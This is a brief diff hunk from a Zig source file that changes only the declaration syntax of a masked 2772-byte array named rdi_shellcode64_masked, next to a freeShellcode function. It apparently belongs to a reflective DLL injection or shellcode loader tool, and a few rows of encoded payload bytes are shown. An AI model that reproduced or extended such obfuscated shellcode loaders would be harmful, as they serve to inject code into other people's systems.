@@ -200,7 +200,7 @@ fn freeShellcode(shellcode_bytes: []const u8) void {
     std.heap.page_allocator.free(shellcode_bytes);
 }
 
-const rdi_shellcode64_masked: [2772]u8 = .{
+const rdi_shellcode64_masked = [2772]u8{
     29,  222, 145, 29,  220, 13,  93,  17,  220, 29,  117, 25,  220, 21,  77,  220,
     5,   69,  0,   3,   2,   20,  1,   20,  0,   20,  3,   20,  2,   29,  216, 57,
     113, 197, 29,  212, 185, 37,  84,  85,  85,  16,  102, 170, 146, 16,  133, 62,
